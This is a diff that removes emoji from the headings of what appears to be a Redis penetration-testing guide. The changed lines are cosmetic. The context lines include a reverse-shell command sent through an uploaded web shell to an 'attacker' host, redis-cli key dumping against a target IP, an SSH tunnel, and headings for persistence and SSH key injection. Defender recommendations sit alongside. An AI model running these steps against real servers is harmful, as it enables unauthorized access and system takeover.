@@ -1,6 +1,6 @@
 # Port 6379 - Redis - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: Redis (Remote Dictionary Server)
 **Port**: 6379 (default)
@@ -8,7 +8,7 @@
 **Encryption**: Optional (TLS), often unencrypted
 **Authentication**: Optional (requirepass), often none
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **Unauthenticated Access**: Connect without password
 - **Data Extraction**: Dump all Redis data
@@ -18,7 +18,7 @@
 - **Cron Job Creation**: Establish persistence
 - **Master/Slave Exploitation**: Replicate malicious data
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Reconnaissance
 
@@ -337,7 +337,7 @@ redis-cli -h 192.168.1.100 KEYS "*"
 # Extract and use on other services
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing Authentication
 
@@ -371,7 +371,7 @@ ssh -L 6380:192.168.1.100:6379 user@jumphost
 redis-cli -h localhost -p 6380
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 **Critical Commands**:
 ```bash
@@ -394,7 +394,7 @@ CLIENT LIST
 SLOWLOG GET 10
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Require Password** - Always set requirepass
@@ -408,7 +408,7 @@ SLOWLOG GET 10
 9. **Monitor Logs** - Detect unauthorized access
 10. **Update Redis** - Patch known vulnerabilities
 
-## ⚠️ Common Mistakes
+## Common Mistakes
 
 **Attacker Mistakes**:
 1. Not checking for unauth access first
@@ -424,7 +424,7 @@ SLOWLOG GET 10
 5. **Default config** - Protected mode off
 6. **Dangerous commands enabled** - CONFIG, MODULE LOAD
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Discovery
@@ -456,7 +456,7 @@ curl http://192.168.1.100/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker/44
 # Full system compromise
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **Discovery**: Nmap
@@ -466,7 +466,7 @@ curl http://192.168.1.100/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker/44
 - **Data Extraction**: redis-cli --rdb
 - **Exploitation**: Metasploit, custom scripts
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 80/443**: Upload web shell
 - **Port 22**: SSH key injection
